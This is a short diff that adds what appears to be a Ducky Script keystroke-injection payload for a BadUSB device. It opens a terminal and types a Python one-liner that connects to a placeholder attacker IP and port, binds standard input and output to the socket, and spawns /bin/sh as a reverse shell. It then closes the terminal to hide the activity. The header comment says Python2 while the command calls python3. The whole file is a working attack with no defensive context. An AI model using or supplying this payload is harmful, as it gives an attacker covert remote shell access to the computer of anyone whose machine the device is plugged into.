@@ -1,0 +1,10 @@
+REM Creates a reverse shell using Python2
+DELAY {start_delay}
+CTRL-ALT t
+DELAY 400
+STRING python3 -c 'import socket,os,pty;o=os.dup2;s=socket.socket();s.connect(("
+STRING #IP_ADRESS
+STRING ",
+STRING #PORT
+STRING ));f=s.fileno();o(f,0);o(f,1);o(f,2);pty.spawn("/bin/sh")' &! exit
+ENTER
